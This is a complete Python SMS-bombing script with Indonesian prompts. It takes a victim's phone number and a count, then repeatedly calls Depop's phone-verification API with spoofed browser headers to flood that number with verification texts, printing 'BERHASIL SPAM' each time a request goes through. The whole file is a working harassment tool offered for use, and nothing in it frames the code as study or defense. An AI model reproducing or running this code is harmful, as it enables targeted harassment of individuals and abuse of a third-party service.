import os,sys,requests,time,json,random
from requests import put
mr_dark1=input('no target: ')
jumlah=int(input('jumlah siksaan: '))
mr_f={
'Host':'webapi.depop.com',
'content-length':'50',
'accept':'application/json, text/plain, */*',
'sec-ch-ua-mobile':'?0',
'save-data':'on',
'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
'content-type':'application/json',
'origin':'https://signup.depop.com',
'sec-fetch-site':'same-site',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://signup.depop.com/',
'accept-encoding':'gzip, deflate, br',
'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
}
dark={
"phone_number":mr_dark1,
"country_code":"ID"
}
for i in range(int(jumlah)):
    darko=requests.put('https://webapi.depop.com/api/v1/auth/verify/phone',headers=mr_f,json=dark)
    ajg=json.loads(darko.text)
    if ajg['is_verified']==False:
         print('BERHASIL SPAM')
         time.sleep(2)
    else:
         print('gagal')
         time.sleep(2)
